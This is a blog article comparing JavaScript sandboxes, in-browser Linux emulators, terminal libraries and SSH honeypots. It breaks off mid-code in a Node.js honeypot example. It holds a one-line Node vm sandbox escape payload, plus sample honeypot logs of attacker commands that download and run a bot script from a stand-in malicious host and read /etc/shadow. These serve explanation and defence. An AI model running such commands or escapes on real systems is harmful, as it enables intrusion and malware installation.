---
title: Comparing JavaScript Solutions for Linux Kernel Simulation
description: An in-depth analysis of Linux environment recreations
  in JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "h/XVhp2n1rt6Omo2E3udz7X8bArBOZTFGtJEZCeAZaWEpjGw80WF7aMeoE/l3OL1TrZqGPVq8WzLZNAbSNscdw=="
---

# Every JavaScript Sandbox, Emulator, Simulator, and Linux Honeypot -- Compared

OK so I've been way too deep in this rabbit hole for a while. It all started because I was helping on [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- a project by Fortune (I'll come back to that in a moment) -- and people kept asking me "wait, what's the difference with `v86`?" or "why not use `vm2`?" -- and I realized I couldn't give a clear answer without mapping the whole ecosystem first. So here we are I guess.

Turns out there are four distinct families -- JS sandboxes, Linux emulators, Linux simulators, and honeypots -- and they almost never overlap, even though people constantly mention them in the same breath. Someone building a plugin system uses `isolated-vm`. Someone making a CLI tool demo uses `v86`. Someone doing SSH threat intel uses Cowrie. They solve completely different problems under the same vague umbrella of "running code in a box."

I spent a lot of time reading source code, CVE reports, architecture docs, and npm pages to write this article. It's going to be long -- grab a coffee, seriously. Or two.

> Little disclaimer: `typescript-virtual-container` is featured in this article because that's what triggered this research. I tried to be fair to everything else, but keep that context in mind.

---

## Part 0 -- First, What Problem Are You Actually Solving?

Before diving in, it's worth being precise about what each family is good for, because terminology gets fuzzy fast and people mix everything up constantly (me included, before I sat down and mapped it all out properly).

**JS sandboxes** isolate JavaScript code from the host Node.js process. The threat model is: untrusted JS code that might call `process.exit()`, read files, or spawn child processes. The solution is a boundary around V8 execution. Those tools have no notion of a Linux shell, a filesystem with permissions, or SSH.

**Linux emulators** run a real unmodified Linux kernel in a CPU emulator (x86, RISC-V, OR1K) implemented in JavaScript or WebAssembly. You boot a real OS. You get real syscalls. You get binary compatibility with programs compiled for x86. The resource cost is huge.

**Linux simulators** mimic the *behavior* of a Linux system without running a real kernel. They implement a shell interpreter, a virtual filesystem, and enough Unix semantics to fool programs and humans. No kernel, no Wasm, no CPU emulation. Way fewer resources.

**Honeypots** are built to be attacked and record what attackers do. They're not primarily execution environments -- they're observability tools. Fidelity to real Linux behavior only matters insofar as it stops the attacker from spotting the trap.

With that frame, here's where each project in this article sits:

```
JS sandbox:       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux emulator:  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux simulator: typescript-virtual-container (unique in this space)
Honeypot:         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Terminal stack:   xterm.js + node-pty (not an isolator, but related)
```

---

## Part 1 -- JavaScript Sandboxes

### 1.1 `vm` -- Node.js's native module (not what you think)

The oldest answer to "run untrusted JS" in Node is the native `vm` module. It's been there since v0.1, so lots of people reach for it first -- and get burned.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

What `vm` actually does: it creates a new V8 context (a new set of native constructors -- `Object`, `Array`, `Function`, etc.) and runs code in it, with a shared reference to whatever you put in `sandbox`. Your V8 engine doesn't change. Your process doesn't change. Memory is shared.

Why `vm` offers zero security: JavaScript's prototype chain is a DAG connecting everything to `Object.prototype`. If you put one host-world object in the sandbox, the guest can walk up its prototype chain and reach host constructors. From `Function`, you can call `Function("return process")()` and get the real `process`. Game over. Like, immediately.

```js
// This works perfectly in vm -- you get the real process
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

I mean, Node.js's own docs say: "The vm module is not a security mechanism. Do not use it to run untrusted code." That warning has been there forever. People ignore it constantly. I've seen production apps use `vm` as a sandbox. Please don't do that.

**Verdict**: a scoping mechanism, not a sandbox. Use it when you need to isolate variables (template engines, `eval`-like features where you control the code). Never for untrusted input.

**Memory**: negligible overhead -- same V8 heap as the host process.
**Security**: none against a motivated attacker.

---

### 1.2 `vm2` -- the community attempt, and its very long death

`vm2` was the community's answer to the `vm` escape problem. The core idea: wrap every object crossing the sandbox boundary in a `Proxy` intercepting property access, blocking prototype climbing, and filtering dangerous references. Clever idea in theory! In practice the result proved far less convincing, as we'll see.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // throws VMError, process unreachable
```

For several years, it worked rather well. But the attack surface of JavaScript `Proxy`s is huge. Every new JS language feature -- generators, async iterators, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise` internals -- is a potential bypass vector.

The CVE timeline is... something. Like, look at this:

| Date | CVE | Mechanism |
|------|-----|-----------|
| Oct 2022 | CVE-2022-36067 | Host context escape via `Error.prepareStackTrace` |
| Apr 2023 | CVE-2023-29017 | Host object leak via unhandled async error |
| Apr 2023 | CVE-2023-29199 | Exception sanitization bypass via `handleException()` |
| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| May 2023 | CVE-2023-32314 | `Proxy` on `Error.name` → `Function` → RCE |
| Jul 2023 | CVE-2023-37466 | Async function + stack overflow + `Proxy.getPrototypeOf` |
| Jul 2023 | CVE-2023-37903 | Worker thread + eval escape |

Three critical CVEs in the same month (April 2023). THREE. IN ONE MONTH. After CVE-2023-37903, the maintainer officially deprecated the library with the message: *"The library contains critical security issues and should not be used in production."*

The maintainer revived it in October 2025 with version 3.10.0, claiming to have fixed everything known at the time. A new critical escape (CVE-2026-22709, CVSS 9.8) was disclosed in January 2026, followed by a batch of eleven more in May 2026. Eleven. The pattern hasn't changed and honestly I don't think it ever will.

The fundamental problem is architectural -- and it's the lesson the whole ecosystem took a while to learn. You can't build a secure sandbox using the same language you're isolating, on the same engine, in the same process. The escape surface is the entire V8 implementation -- and V8 is several million lines of C++ changing constantly. Every new JS feature potentially opens a new attack path.

**Verdict**: Don't use for security-sensitive applications. Even on the latest version, new bypasses surface every few months. The maintainer himself openly acknowledged it.

---

### 1.3 `isolated-vm` -- the one that actually works

`isolated-vm` takes the right approach: using V8's native isolation primitive, the Isolate. Each V8 Isolate has its own heap, its own garbage collector, its own set of natives, and zero shared references with other Isolates.

It's the same boundary Chrome uses between tabs. It's a real security barrier, not a language trick built on Proxies.

```js
import ivm from "isolated-vm";

// Each isolate is its own V8 heap
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // limit in MB
const context = await isolate.createContext();
const jail = context.global;

// Passing data across the boundary requires explicit serialization
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Cannot reach the host process, host heap, or host modules
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// You can brutally terminate on timeout or memory limit
isolate.dispose(); // frees the whole heap
```

The `Reference` and `ExternalCopy` types are the explicit communication bridge. A `Reference` gives the isolate a callable handle to a host function -- the isolate can call it but can't inspect its closure or prototype. An `ExternalCopy` serializes a value (structured clone) across the heap boundary. That explicit bridge model isn't convenient, but it's what makes isolation real.

You can set strict resource limits: memory (the isolate is killed if it exceeds the limit), wall-clock timeout, and CPU timeout. Termination is real -- it kills the whole V8 Isolate, not just a JS timeout that can be bypassed with a `while(true)`.

**Limits**: it's JS only. You can't run bash in it. There's no notion of files, permissions, network, or processes. It's exactly the right tool for user-submitted JS (plugins, formulas, script hooks), and the wrong tool for everything else. The author of `typescript-virtual-container` mentioned she considered it early on before realizing "running shell commands" and "isolating JavaScript" are fundamentally different problems.

**Memory**: ~3-10 MB per empty isolate, grows with heap use.
**Security**: solid. The V8 Isolate boundary is the real isolation primitive.
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- a separate JS engine compiled to Wasm

A different approach: instead of isolating inside V8, run a completely separate JavaScript engine compiled to WebAssembly. The host runs in V8/Node. The guest runs in QuickJS-in-Wasm. The Wasm sandbox provides the isolation boundary.

QuickJS is yet another work by Fabrice Bellard (the same guy behind QEMU, FFmpeg, JSLinux, TinyEMU -- that person isn't real, seriously, how does one person do all that?). It's a small ES2023-compliant JS engine written in C, and compiled to Wasm it's only about 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Runs in QuickJS, fully separate from V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS is a small ES2023-compliant JavaScript engine written in C. Compiled to Wasm, it's about 500 KB for the sync variant, ~1 MB for the async variant (Asyncify). Memory management is manual -- every value you pull out of the VM must be explicitly freed, which is a bit annoying but prevents cross-boundary GC surprises. A fun tradeoff!

The `@sebastianwessel/quickjs` wrapper adds a friendlier API on top, with an optional virtual filesystem, fetch support, and Node.js module stubs:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

The security model differs from `isolated-vm`: Wasm's linear memory model means the guest can't directly reach V8 heap objects. The attack surface is the host↔Wasm interface (imports/exports), not the whole JS language. That's generally considered more robust than Proxy-based sandboxes.

The downside: QuickJS doesn't have V8's optimization level. For CPU-bound JS workloads, it's 5 to 20x slower than V8. For small snippets and untrusted evaluations, that generally doesn't matter.

**Memory**: ~500 KB Wasm module + per-instance heap.
**Security**: Wasm boundary, considered more solid than Proxy-based approaches.
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- a permissions-first runtime

Deno takes a completely different philosophy: instead of sandboxing inside Node, build a new runtime that's secure by default. I really like that approach -- it's what Node.js should have been from the start, honestly. Ryan Dahl (Node.js's original creator) literally created Deno because he regretted some Node.js design decisions, which is pretty wild when you think about it.

Every sensitive capability (file read, file write, network, env, subprocess) requires an explicit `--allow-*` flag:

```bash
# This one can only read in /data, nothing else
deno run --allow-read=/data script.ts

# This one can only reach a single domain
deno run --allow-net=api.example.com script.ts

# No flags = no permissions
deno run untrusted.ts # can't read, write, network, spawn
```

The permission model is implemented at the Rust/OS level -- it's not a JS trick. When Deno code calls `Deno.readFile()`, it goes through a Rust op checking the permission table before touching the filesystem. You can't bypass it from JS because the syscall never happens if the permission isn't granted.

For running truly untrusted code, Deno Workers (Web Workers) provide a second isolate in the same process, each with its own permission set. You can spawn a worker with zero permissions and talk to it via `postMessage`.

Deno 2 (released October 2024) added full npm compatibility and Node.js compat shims, which considerably improved its adoption for server-side use cases.

**The tradeoff**: Deno's security model is excellent for code you might partially trust. For fully untrusted code that could be adversarial, the permission model doesn't help -- you need an Isolate boundary (`isolated-vm`) or a different engine (`quickjs-emscripten`), because Deno still uses V8 and sophisticated attackers can find V8-level bugs.

---

### 1.6 TC39 ShadowRealm -- the standardized answer (someday)

The JavaScript standards body (TC39) has a proposal called ShadowRealm trying to standardize what `vm` and `vm2` attempted, but with a correct security model. A ShadowRealm creates an isolated JS execution context with its own intrinsics, no access to the outer realm, and a carefully controlled import/export interface.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Separate intrinsics, no outer-realm access
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm is available in browsers (Chrome 90+, Firefox 105+) but isn't in stable Node.js as of 2026. The TC39 Compartments proposal builds on it for module-level isolation. Those are the long-term standardized answers, but they're not production-ready for server-side Node yet. It's one of those things you see coming from afar but... it's just not there yet. Classic TC39.

---

### Sandbox family summary

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Isolation boundary** | none (scope) | Proxy (broken) | V8 Isolate | Wasm | V8 Isolate + Rust perms |
| **Memory limit** | ❌ | ❌ | ✅ strict limit | ✅ Wasm heap | partial |
| **CPU timeout** | ❌ | ✅ (bypassable) | ✅ strict | ✅ | ✅ |
| **Security** | none | broken | solid | solid | solid |
| **JS speed** | native V8 | native V8 | native V8 | ~10x slower | native V8 |
| **Browser** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node compat** | native | ✅ | ✅ | partial shims | partial |
| **Status** | stable | risky (new CVEs) | ✅ active | ✅ active | ✅ active |
| **RAM overhead** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

The verdict: if security matters to you, there are exactly two real options -- `isolated-vm` (native extension, V8 Isolate, full JS speed) and `quickjs-emscripten` (Wasm, browser-compatible, ~10x slower on compute-heavy work). Everything else is either "please don't do that" (`vm`, `vm2`) or a runtime solving a completely different problem (Deno). ShadowRealm could change the game someday, but not yet.

---

## Part 2 -- Linux Emulators in JavaScript

This is where things get really interesting for me. These are *real* emulators -- they implement a CPU instruction set in JavaScript or WebAssembly, boot a real Linux kernel image, and run real user binaries. Isolation comes from guest and host sharing nothing: different memory spaces, different instruction streams.

The price is huge, but what you get is genuinely remarkable: real Linux, really running, in your browser or Node process. Like, that's pretty wild when you think about it, right?

### 2.1 `v86` -- x86 PC emulator in JS + Wasm JIT

`v86` by Fabrice (copy on GitHub) is the most capable open-source x86 emulator in JavaScript. It started as a pure JS interpreter around 2013 and evolved into a JIT system where x86 basic blocks translate to WebAssembly on the fly, considerably improving performance.

What it emulates:
- **CPU**: x86-32 (IA-32), instruction set roughly Pentium 1 level. 64-bit (x86-64) stays excluded -- it's a hardware architectural limit, not a missing feature.
- **FPU**: via JavaScript's `Float64Array`. x87 is 80-bit extended precision; JS doubles are 64-bit. That means float results can differ slightly from a real CPU.
- **Memory**: configurable, mapped to a `SharedArrayBuffer` or `ArrayBuffer` in the JS heap.
- **Hardware**: 8254 PIT (timer), 8259 PIC (interrupt controller), 8042 keyboard controller (PS/2), CMOS RTC, VGA with SVGA extensions and Bochs VBE, IDE controller, floppy controller (8272A), NE2000 network card.
- **BIOS**: uses SeaBIOS (open-source x86 BIOS).

The JIT works by identifying basic blocks (x86 instruction sequences with no jumps), translating them to a WebAssembly function, caching that function, and calling it on later runs of the same block. Hot code paths get native Wasm performance. Cold paths fall back to the JS interpreter.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Capture serial output (Linux kernel console)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Send input to the guest (type in the shell)
emulator.serial0_send("ls /\n");
```

**Supported OSes**: Alpine Linux (excellent), Ubuntu 16.04/18.04 (i386 only), 32-bit Arch Linux, ReactOS, FreeDOS, Windows 9x/2000 (with caveats), MS-DOS.

**Boot time**: 15-40 seconds for Alpine Linux from a clean image. That's inherent to real kernel init -- you can't skip it. Yes, your users will watch a Linux kernel boot in their browser. That's the deal.

**Minimum memory**: 100-256 MB per instance. The Wasm JIT code cache alone can reach tens of MB for a busy Linux instance.

**Node.js use**: fully supported. The DOM stays superfluous -- VGA output can be ignored if you only care about serial output.

**What you can't do**: run 64-bit binaries, use modern kernel features (eBPF, io_uring, ...), or run more than a handful of simultaneous instances without hitting memory limits.

**npm**: [v86](https://www.npmjs.com/package/v86) -- continuously updated, latest publish the same day as I'm writing.
**GitHub**: [copy/v86](https://github.com/copy/v86)
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux and TinyEMU -- Bellard's work, twice

JSLinux is Fabrice Bellard's own Linux emulator in JavaScript -- the very first, published in 2011. I keep mentioning Bellard in this article because he keeps reappearing: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. That guy is something else. Genuinely one of the most impressive individual technical contributions in software history, no exaggeration.

The original JSLinux was a pure JS x86 interpreter. In 2016, Bellard wrote TinyEMU (a RISC-V emulator in C), compiled it to JavaScript via Emscripten, and that became the base of today's JSLinux. So today's JSLinux is actually C code generating JavaScript -- not hand-written JS at all.

The technical notes on Bellard's site are worth reading: today's JSLinux runs a 32- or 64-bit RISC-V CPU (not x86), emulating a VirtIO console, VirtIO network, VirtIO block device, and a 9P filesystem for host file sharing. The JS demo is compiled from C using Emscripten -- it's not hand-written JS.

TinyEMU itself supports:
- RISC-V RV32IMAFDQC and RV64IMAFDQC (32- and 64-bit, with float, multiply, compressed instructions)
- x86 via KVM (native only, no emulation -- so the JS version is RISC-V only)
- VirtIO console, network, block, input, 9P filesystem

TinyEMU has a JavaScript demo provided via Emscripten. It's the base of JSLinux and is also used by `container2wasm` (see section 2.5).

**JSLinux status**: no npm package, no programmable API. It's a demo you open in your browser. Historical importance is huge -- it proved the concept. Practical usefulness as a library: nil.

**TinyEMU**: not on npm, C source available at [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- OR1K emulator

jor1k is an OpenRISC 1000 (OR1K) emulator written in JavaScript by Sebastian Macke. It's interesting historically because jor1k introduced VirtIO 9P filesystem support, which Bellard then integrated into TinyEMU and JSLinux. Cross-pollination between those projects is tight -- they all borrow ideas from each other, which is honestly one of the coolest things about open-source emulation work.

**Status**: no longer actively maintained, no npm package. Archived at this point. Mostly useful to know for historical context -- like, if someone mentions jor1k in conversation, now you know what it is :)

---

### 2.4 CheerpX -- commercial x86 emulator for the browser

CheerpX by Leaning Technologies is the production-grade commercial x86 Linux emulator. It's not open-source, but it's nettement more capable than v86 for running a real Debian/Ubuntu userspace. If you need a real VSCode in the browser, that's what you need.

Key differences with v86:
- Supports a wider ISA (more x86 extensions, better glibc compatibility)
- IndexedDB-based filesystem in the browser (persistent across page reloads)
- pthread support via `SharedArrayBuffer` (which needs the COOP/COEP headers -- yes those annoying security headers)
- Built to run VSCode, Python, Node.js, and other real apps -- not just minimal OS images
- Professional support and SLA available (aka you can yell at someone if it breaks)

The typical use case is "run a real Linux app in the browser with no server." Companies use it for browser-based IDEs, coding tutorials, and interactive docs.

```js
// CheerpX API (simplified)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js story**: CheerpX is browser-first. The underlying emulator could theoretically run in Node (it's Wasm), but the API and docs are entirely geared toward browser use. Server-side use isn't supported.

**Memory**: similar to v86 -- 200+ MB for a real Debian instance.
**Pricing**: free for open-source projects, commercial license for production SaaS.
**Docs**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js in Wasm, not Linux emulation

WebContainers are often lumped with Linux emulators but are architecturally different. They don't emulate x86. They don't boot Linux. They run Node.js compiled to WebAssembly using WASI. That distinction matters a lot and I spent way too long being confused about it.

I think the confusion comes from marketing -- "run Node.js in your browser" sounds like emulation, but it's actually Node.js itself compiled to Wasm, not Linux emulation running Node.js in a VM. Two completely different architectures.

The architecture:
1. Node.js is compiled to Wasm (a specifically customized WASI runtime)
2. A Service Worker intercepts the emulated Node.js server's network requests and routes them to the browser tab
3. The filesystem lives in browser memory (no disk I/O)
4. npm is a custom implementation optimized for browser use

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Write files
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Run Node.js commands
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Since it runs real Node.js (compiled to Wasm), you get a real npm, real Node.js APIs, and real module resolution. You don't get a general Linux userspace -- you can't `apt`-install system packages, run arbitrary compiled binaries, or do much outside the Node.js ecosystem.

**Browser prerequisites**: SharedArrayBuffer (needs COOP/COEP headers), Service Worker support, modern Wasm.

**Node.js story**: designed exclusively for browser use. The API doesn't work outside a browser context.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Docs**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- Docker containers compiled to Wasm

`container2wasm` is a tool (not an npm package) from NTT that takes a Docker container image and converts it to a WebAssembly binary that can run on any Wasm host -- including a browser. When I first saw that, I really didn't believe it worked.

The mechanism:
- For x86_64 containers: embeds Bochs (an x86 emulator, compiled to Wasm) + the container's root filesystem
- For riscv64 containers: embeds TinyEMU (Bellard again!) + the container's root filesystem
- The resulting `.wasm` file boots the emulator, mounts the container filesystem, and runs the container's entrypoint

```bash
# Convert an Ubuntu 22.04 container to Wasm
c2w ubuntu:22.04 out.wasm

# Run it
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Or serve it for browser use
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

The resulting `.wasm` is bulky -- a minimal Ubuntu is several hundred MB -- but fully self-contained. You can email someone a `.wasm` and they can run Ubuntu in their browser. That sentence shouldn't make sense but here we are.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Emulator family summary

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Architecture** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprietary) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Real kernel** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **npm package** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI tool) |
| **Node.js use** | ✅ | ❌ | ❌ | ❌ | ❌ (browser only) | via Wasmtime |
| **Browser use** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instance** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Boot time** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open source** | ✅ | ✅ | ✅ | ❌ | partial | ✅ |
| **Status** | ✅ very active | ✅ stable | ⚠️ archived | ✅ commercial | ✅ active | ✅ active |

What jumps out of that table: `v86` is the only one that's an npm package, running in both browser and Node, and open-source. That's why it dominates the "Linux emulators in JavaScript" conversation. Everything else has a drawback -- JSLinux has no API, jor1k is archived, CheerpX costs money, WebContainers is browser-only and Node-specific, container2wasm needs a build step and CLI. If you just need to "boot Linux in JavaScript", `v86` is almost always the right starting point.

---

## Part 3 -- Terminal Stacks: xterm.js and node-pty

Two packages keep coming up when people build shell-like experiences. They're not sandboxes or emulators -- they're the UI and PTY plumbing -- but they're so related I'd feel bad leaving them out. Also, I used both and they're really good.

### 3.1 `xterm.js` -- terminal rendering

xterm.js is a terminal emulator for the browser. It displays a terminal screen (VT100/xterm escape sequences) in a `<canvas>` element, handles keyboard input, and exposes an API to pipe data through.

Used by: VS Code's integrated terminal, Azure Cloud Shell, Proxmox VE, AWS CloudShell, and more.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Send data to the terminal (displayed as text)
term.write("$ ");
term.onData(data => {
  // data are keystrokes -- send to your backend
  socket.send(data);
});
socket.onmessage(msg => {
  // backend output -- display it
  term.write(msg.data);
});
```

xterm.js is only the render layer. It doesn't run a shell. It doesn't interpret commands. It's a display widget you wire to the backend of your choice. Lots of people think xterm.js "does the terminal" but it's really just the screen -- you still have to connect it to something actually running commands.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- PTY creation

`node-pty` creates a pseudoterminal (PTY) in Node.js and hands you a read/write handle on it. Used with xterm.js, it builds a browser terminal talking to a real shell (bash, zsh, fish) running on the server.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Send to the browser xterm.js via WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Forward browser keystrokes to the shell
  shell.write(data);
});
```

That's the standard pattern for cloud IDEs and web terminals: xterm.js (browser) ↔ WebSocket ↔ node-pty ↔ real bash. Isolation remains nonexistent. The shell runs with all the Node.js process's permissions (or the user launching it).

**Maintained by**: Microsoft.
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub (Microsoft)**: [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Part 4 -- SSH Honeypots

Honeypots are built to be attacked. The goal is looking real enough for attackers to interact with them, while recording everything they do for threat intel. SSH is the main target because it's the most attacked service on the internet -- if you expose port 22 on a public IP, you'll see automated scan attempts within literally minutes. Try it someday, it's pretty horrifying how fast it happens.

A honeypot's quality measures on two things: **fidelity** (how convincingly it imitates a real system) and **telemetry** (how much useful data it captures). Those two are in tension. A high-fidelity honeypot is harder to build and riskier to operate.

This section is what finally led me to build the `HoneyPot` module in `typescript-virtual-container`, so I have some opinions here.

### 4.1 Cowrie -- the gold standard

Cowrie is a medium-to-high interaction SSH and Telnet honeypot based on Python. It's the most deployed SSH honeypot in the research and security community.

Architecture:
- **Protocol layer**: real SSH protocol implementation (Twisted Conch), so attackers get real handshakes, real key exchange, real auth
- **Shell layer**: a fake filesystem (looking like Debian 5.0) and a partial shell interpreter answering common commands
- **Proxy mode**: can forward to a real system behind (high interaction mode), recording everything passing through
- **LLM mode** (recent addition): uses a language model to generate dynamic replies to commands it can't handle -- yes, Cowrie now has an AI mode. We live in a wild time.

```python
# What Cowrie captures
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie saves downloaded files (via wget/curl/SFTP/SCP) for malware analysis. It integrates with Splunk, Elasticsearch, and other SIEM platforms.

**Fidelity**: medium-high. Convincing enough to fool automated bots (which is 99% of SSH attackers -- most are just dumb scripts trying `root`/`password`). Sophisticated humans can fingerprint it though, usually pretty fast.

**Language**: Python (Twisted)
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- Cowrie's predecessor

Kippo is the original medium-interaction SSH honeypot Cowrie was based on. Same core idea: real SSH protocol, fake filesystem, partial shell. Cowrie fully superseded it at this point -- Kippo is archived and nobody should use it in 2026. Mentioned here purely for historical completeness, since you might see it referenced in old blog posts and security papers.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- archived

---

### 4.3 endlessh -- the SSH tarpit

endlessh is a degenerate honeypot: it keeps SSH connections open by slowly dripping banner data at 1 byte per second (or less). An SSH client connecting to it stays stuck forever -- it never reaches auth because the server never finishes sending the banner.

The goal isn't threat intel but pure resource denial: keeping attackers' scan threads busy so they can't reach real targets as fast. It's honestly a bit diabolical in a good way. You learn nothing from the attacker -- you just waste their time. There's something deeply satisfying about that.

```c
// endlessh's whole protocol behavior:
// Send: "SSH-2.0-OpenSSH_" then slowly add random chars
// Never close the connection
// The attacker's scanner times out after N seconds
```

No commands captured. No auth tested. Just connection time.

**Written in**: C
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- the "let everyone in" honeypot

sshesame accepts every SSH connection (any user, any password, any key) and records everything. It's a zero-interaction honeypot: it doesn't reply to commands, it just lets attackers "enter" and records every keystroke they type.

```
2024-01-15 03:22:11 Connection from 45.33.32.156
  User: root, Password: password123 -- accepted
  Typed commands:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Disconnected after 47s
```

Useful for credential harvesting: you quickly accumulate the usernames and passwords bots try, telling you which default creds are actively bruteforced. Spoiler: it's always `root`/`password`, `admin`/`admin`, and `root`/`123456`. Every time.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- Docker-based honeypot framework

`lyrebird/honeypot-base` is a Docker base image for building network-service honeypots. It's not specifically an SSH honeypot -- it's a framework for building honeypots for any protocol.

The base image provides a logging framework, a plugin system for protocols, and Docker Compose configs for multi-service honeypots. You extend it to simulate specific services.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Building an SSH honeypot in Node.js -- the naive way, and why it fails

Before `typescript-virtual-container`, building an SSH honeypot in Node.js meant combining the real `ssh2` library with manual command simulation. Very tedious, very incomplete, but... it's a rite of passage at this point:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Log the attempt
